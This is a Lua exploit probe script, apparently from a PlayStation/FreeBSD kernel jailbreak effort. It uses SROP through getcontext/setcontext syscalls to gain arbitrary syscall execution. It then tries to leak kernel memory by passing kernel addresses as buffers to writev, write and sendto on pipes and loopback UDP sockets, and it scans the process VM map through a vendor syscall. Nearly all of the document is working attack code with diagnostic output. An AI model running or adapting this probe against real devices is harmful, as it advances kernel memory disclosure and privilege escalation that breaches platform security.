-- CRASH_CLASS: MODERATE
-- PROBE 152c: Kernel read via pipe writev with kernel iov_base
--
-- Theory: SROP gives us arbitrary syscall execution with full register control.
-- If we call writev(2) with an iovec whose iov_base points to kernel memory,
-- the kernel MIGHT copy from kernel space into the pipe buffer, then we read
-- it back from the pipe's read end.
--
-- On FreeBSD, writev uses copyin() for the iovec array itself (from user space)
-- but then uiomove() to copy from iov_base. uiomove normally checks that the
-- source is in user space, BUT: if there's a bug in the validation or if the
-- kernel trusts a pre-validated pointer, we could read kernel memory.
--
-- Even if this doesn't work for direct kernel reads, we test:
-- 1. Does writev accept iovec from a pipe fd? (via SROP-created pipe)
-- 2. What error code for kernel-space iov_base?
-- 3. Does the kernel give EFAULT immediately or after partial copy?
-- 4. Can we use process_vm_readv (syscall doesn't exist on FreeBSD, but
--    Sony may have added it)?

print("=== PROBE 152c: KERNEL READ VIA PIPE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function wq(addr, val) memory.write_qword(addr, val) end
local function wd(addr, val) memory.write_dword(addr, val) end

local pid = to_num(make_syscall(20)())
print("pid=" .. pid)

local sc_gc = make_syscall(421)
local sc_sr = make_syscall(417)
local sc_mmap = make_syscall(477)
local MC = 0x40
local srop_ctx = memory.alloc(0x500)
pcall(function() return sc_gc(uint64(srop_ctx)) end)
local brip = memory.read_qword(srop_ctx + MC + 0xA0)
local rh, rl = get_hi_lo(brip)
local sc_addr = uint64(string.format("0x%X%08X", rh, rl - 2))

local function srop(num, a1, a2, a3, a4, a5, a6)
    pcall(function() return sc_gc(uint64(srop_ctx)) end)
    wq(srop_ctx + MC + 0xA0, sc_addr)
    wq(srop_ctx + MC + 0x38, uint64(num))
    if a1 then wq(srop_ctx + MC + 0x08, a1) end
    if a2 then wq(srop_ctx + MC + 0x10, a2) end
    if a3 then wq(srop_ctx + MC + 0x18, a3) end
    if a4 then wq(srop_ctx + MC + 0x50, a4) end
    if a5 then wq(srop_ctx + MC + 0x28, a5) end
    if a6 then wq(srop_ctx + MC + 0x30, a6) end
    local ok, rv = pcall(function() return sc_sr(uint64(srop_ctx)) end)
    if not ok then return nil end
    return rv
end

local _, gpu = pcall(function()
    return sc_mmap(uint64(0), uint64(0x200000), uint64(3),
        uint64(0x1002), uint64("0xFFFFFFFFFFFFFFFF"), uint64(0))
end)
local gh, gl = get_hi_lo(gpu)
local function ga(off) return uint64(string.format("0x%X%08X", gh, gl + off)) end

-- [A] Create a pipe via SROP
print("--- [A] PIPE CREATION ---")
local pipe_r = srop(42)
local pipe_rd = pipe_r and to_num(pipe_r) or -1
local pipe_wr = pipe_rd + 1
print("pipe_rd=" .. pipe_rd .. " pipe_wr=" .. pipe_wr)

-- [B] Test normal writev first (user-space iov_base)
print("")
print("--- [B] NORMAL WRITEV ---")
local iov = gpu + 0x10000
local wbuf = gpu + 0x10100
wd(wbuf, 0x41424344)  -- "DCBA"

-- iovec: {iov_base, iov_len} = 16 bytes on amd64
wq(iov, ga(0x10100))     -- iov_base = wbuf
wq(iov + 8, uint64(4))   -- iov_len = 4

-- writev(pipe_wr, iov, 1) = syscall 121
local wret = srop(121, uint64(pipe_wr), ga(0x10000), uint64(1))
local wrv = wret and to_num(wret) or -999
print("writev_normal=" .. wrv)

-- Read back from pipe
local rbuf = gpu + 0x10200
wq(rbuf, uint64(0))
local rret = srop(3, uint64(pipe_rd), ga(0x10200), uint64(4))
local rrv = rret and to_num(rret) or -999
local rval = to_num(memory.read_dword(rbuf))
print("read=" .. rrv .. " data=0x" .. string.format("%08X", rval))

if rval == 0x41424344 then
    print("*** PIPE I/O WORKS ***")
end

-- [C] Try writev with kernel-space iov_base
print("")
print("--- [C] KERNEL IOV_BASE ---")

-- Test a few kernel addresses
local kaddrs = {
    "0xFFFFFFFF80200000",  -- typical kernel text (no KASLR)
    "0xFFFFFFFF81000000",  -- kernel text + offset
    "0xFFFFFFFF82000000",  -- kernel data region
    "0xFFFF800000000000",  -- direct map start
    "0xFFFF800100000000",  -- direct map +4GB
}

for _, kaddr in ipairs(kaddrs) do
    -- Set iov_base to kernel address, iov_len to 8
    wq(iov, uint64(kaddr))
    wq(iov + 8, uint64(8))

    -- Clear read buffer
    wq(rbuf, uint64(0xDEADDEADDEADDEAD))

    -- writev to pipe
    local wret2 = srop(121, uint64(pipe_wr), ga(0x10000), uint64(1))
    local wrv2 = wret2 and to_num(wret2) or -999

    if wrv2 > 0 then
        -- Read back!
        local rret2 = srop(3, uint64(pipe_rd), ga(0x10200), uint64(8))
        local rrv2 = rret2 and to_num(rret2) or -999
        local val = memory.read_qword(rbuf)
        local vh, vl = get_hi_lo(val)
        print("addr=" .. kaddr .. " writev=" .. wrv2 .. " read=" .. rrv2 .. " val=0x" .. string.format("%X%08X", vh, vl))
        if vh ~= 0xDEADDEAD then
            print("*** KERNEL DATA READ! ***")
        end
    else
        print("addr=" .. kaddr .. " writev=" .. wrv2 .. " (rejected)")
    end
end

-- [D] Try write(2) directly with kernel address as buffer
print("")
print("--- [D] DIRECT WRITE WITH KERNEL BUFFER ---")

for _, kaddr in ipairs(kaddrs) do
    local wret3 = srop(4, uint64(pipe_wr), uint64(kaddr), uint64(8))
    local wrv3 = wret3 and to_num(wret3) or -999

    if wrv3 > 0 then
        wq(rbuf, uint64(0))
        local rret3 = srop(3, uint64(pipe_rd), ga(0x10200), uint64(8))
        local rrv3 = rret3 and to_num(rret3) or -999
        local val = memory.read_qword(rbuf)
        local vh, vl = get_hi_lo(val)
        print("addr=" .. kaddr .. " write=" .. wrv3 .. " read=" .. rrv3 .. " val=0x" .. string.format("%X%08X", vh, vl))
        if vh ~= 0 then
            print("*** KERNEL DATA READ VIA WRITE! ***")
        end
    else
        print("addr=" .. kaddr .. " write=" .. wrv3)
    end
end

-- [E] Try sendto(133) with kernel address as message buffer to a UDP socket
print("")
print("--- [E] SENDTO WITH KERNEL BUFFER ---")

-- Create UDP socket
local udp = srop(97, uint64(2), uint64(2), uint64(17))
local udpv = udp and to_num(udp) or -1
print("udp_fd=" .. udpv)

if udpv >= 0 then
    -- Bind to loopback
    local sa = gpu + 0x11000
    wd(sa, 0x02100002)    -- AF_INET, len=16, port=4096
    wd(sa + 4, 0x0100007F) -- 127.0.0.1
    srop(104, uint64(udpv), ga(0x11000), uint64(16))

    -- Create second UDP socket to receive
    local udp2 = srop(97, uint64(2), uint64(2), uint64(17))
    local udp2v = udp2 and to_num(udp2) or -1

    if udp2v >= 0 then
        -- Bind receiver
        local sa2 = gpu + 0x11100
        wd(sa2, 0x02100102)  -- port=4097
        wd(sa2 + 4, 0x0100007F)
        srop(104, uint64(udp2v), ga(0x11100), uint64(16))

        -- sendto with kernel address as buffer
        local dest = gpu + 0x11200
        wd(dest, 0x02100102)  -- AF_INET port 4097
        wd(dest + 4, 0x0100007F)

        for _, kaddr in ipairs({"0xFFFFFFFF80200000", "0xFFFF800000000000"}) do
            local sret = srop(133, uint64(udpv), uint64(kaddr), uint64(64), uint64(0), ga(0x11200), uint64(16))
            local srv = sret and to_num(sret) or -999

            if srv > 0 then
                -- Try to receive
                local rcvbuf = gpu + 0x12000
                for off = 0, 63, 4 do wd(rcvbuf + off, 0) end
                local rcv = srop(27, uint64(udp2v), ga(0x12000), uint64(0x40))
                print("addr=" .. kaddr .. " sendto=" .. srv .. " *** SENT! ***")
            else
                print("addr=" .. kaddr .. " sendto=" .. srv)
            end
        end

        srop(6, uint64(udp2v))
    end
    srop(6, uint64(udpv))
end

-- [F] Try using SROP to call sys 547 (query_memory_protection)
-- on our OWN mapped pages — looking for pages that overlap with kernel
print("")
print("--- [F] VM MAP SCAN FOR KERNEL-ADJACENT PAGES ---")

-- Get our own VM map via sys 674
local mapbuf = gpu + 0x13000
local map_count = 0
local ret674 = srop(674, ga(0x13000), uint64(0x80000))
local rv674 = ret674 and to_num(ret674) or -1
print("sys674_ret=" .. rv674)

-- Each record is 72 bytes: +0x00 start, +0x08 end, +0x18 prot, +0x20 name
-- Look for the highest address regions near kernel space
if rv674 >= 0 then
    -- Scan for regions > 0x8_00000000 (34-bit boundary)
    local high_regions = 0
    for i = 0, 316 do
        local rec = mapbuf + i * 72
        local start = memory.read_qword(rec)
        local sh, sl = get_hi_lo(start)
        if sh > 0 then
            high_regions = high_regions + 1
            if high_regions <= 10 then
                local end_addr = memory.read_qword(rec + 8)
                local eh, el = get_hi_lo(end_addr)
                print("region " .. i .. ": 0x" .. string.format("%X%08X", sh, sl) .. "-0x" .. string.format("%X%08X", eh, el))
            end
        end
    end
    print("high_regions=" .. high_regions)
end

-- Cleanup
srop(6, uint64(pipe_rd))
srop(6, uint64(pipe_wr))

print("")
print("pid_post=" .. tostring(to_num(make_syscall(20)())))
print("=== DONE ===")
